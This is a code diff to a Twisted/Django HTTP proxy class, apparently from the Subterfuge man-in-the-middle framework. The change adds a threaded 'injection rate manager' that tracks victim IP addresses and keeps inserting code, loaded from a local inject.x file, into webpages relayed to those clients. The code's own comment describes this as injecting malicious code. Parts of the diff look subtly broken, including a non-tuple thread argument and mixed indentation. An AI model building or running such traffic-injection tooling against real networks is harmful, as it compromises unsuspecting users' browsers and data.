@@ -17,6 +17,11 @@
 #
 
 import logging, re, string, random, zlib, gzip, StringIO, os
+
+import sys
+import time
+sys.path.append('/usr/share/subterfuge')
+import threading
   #Ignore Deprication Warnings
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
@@ -31,7 +36,7 @@ settings.configure(DATABASE_ENGINE="sqlite3",
 
 from django.db import models
 from modules.models import *
-
+from main.models import *
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
@@ -67,17 +72,28 @@ class ServerConnection(HTTPClient):
             #Determine if injection is true
         self.injection = module.active
 
+	#Injection Manager (uses settins to determine injection rate)
+    def injectManager(self, clientip):
+        settings = setup.objects.get(id = "1")
+		#Set Injection Bit
+        print "Injection Sent to: " + clientip
+        print "Pausing Injection for " + settings.injectrate + " secs..."
+        iptrack.objects.filter(address = clientip).update(injected = "1")
+
+		#Reset inject	
+        time.sleep(int(settings.injectrate))
+        print "Resuming Injection"
+        iptrack.objects.filter(address = clientip).update(injected = "0")
+
+
 
         #Added by 0sm0s1z to allow for injection of malicious code into the relayed webpage
-    def injectMaliciousCode(self, data, clientip):
-            
+    def injectMaliciousCode(self, data, clientip):   
             #Determine what code is to be injected
         codedir = str(os.path.dirname(__file__)).rstrip("abcdefghijklmnnnopqrstruvwxyz") + "modules/httpcodeinjection/inject.x"
         f = open(codedir, 'r')
         inject = f.readlines()
         
-            #Set Injection bit
-        iptrack.objects.filter(address = clientip).update(injected = "1")
         
             #Modify Data with code injection
         #data += str(inject)
@@ -185,15 +201,21 @@ class ServerConnection(HTTPClient):
            check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
                #Check for uninjected IP Address   
            if check.injected == "0":
-              if len(self.injection) > 2: 
-                  data = self.injectMaliciousCode(data, clientip[0]) 
-                    
+              if len(self.injection) > 2:
+		  #Execute Injection Rate Manager and Injection as Threads                  
+		  #inject = threading.Thread(target = self.injectMaliciousCode, args = (data, clientip[0]))
+		  manager = threading.Thread(target = self.injectManager, args = (clientip))
+		  #data = inject.start()
+		  manager.start()
+		  data = self.injectMaliciousCode(data, clientip[0])
+	
         except:
             newip = iptrack(address = clientip[0], injected = "0")
             newip.save()
             print "New Client Detected! %s" % clientip[0]
             if len(self.injection) > 2: 
                data = self.injectMaliciousCode(data, clientip[0])
+
             
             
         
